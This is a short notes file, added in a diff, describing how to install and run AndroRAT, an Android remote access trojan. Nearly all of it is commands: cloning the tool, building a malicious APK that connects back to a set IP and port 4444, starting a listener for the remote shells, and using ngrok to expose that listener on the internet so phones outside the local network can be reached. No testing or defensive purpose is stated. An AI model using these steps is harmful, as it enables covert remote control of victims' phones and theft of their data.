@@ -1,0 +1,32 @@
+Some info to install and configuration from androRAT.
+
+git clone https://github.com/karma9874/AndroRAT.git
+cd ~/AndroRAT
+pip install -r requirements.txt
+
+
+* Install java for build the apk
+sudo apt install default-jre default-jdk -y
+sudo apt install zipalign # install only if is neccesary
+
+* For build the apk file
+cd ~/AndroRAT
+python3 androRAT.py --build -i 192.168.2.12 -p 4444 -o testlocal.apk
+
+* To listen connections
+python3 androRat.py --shell -i 0.0.0.0 -p 4444
+
+
+- Ngrock install for web use
+Using apt
+curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null && echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list && sudo apt update && sudo apt install ngrok
+
+Normal Install
+sudo tar xvzf ~/Downloads/ngrok-stable-linux-amd64.tgz -C /usr/local/bin
+
+- Using Ngrock.
+Before of this execute ->
+$ ngrok authtoken <yourtoken>
+
+See the token in dashboard.ngrok.com/get-started/your-authtoken
+ngrock tcp 4444 # to listen now and create a url in internet
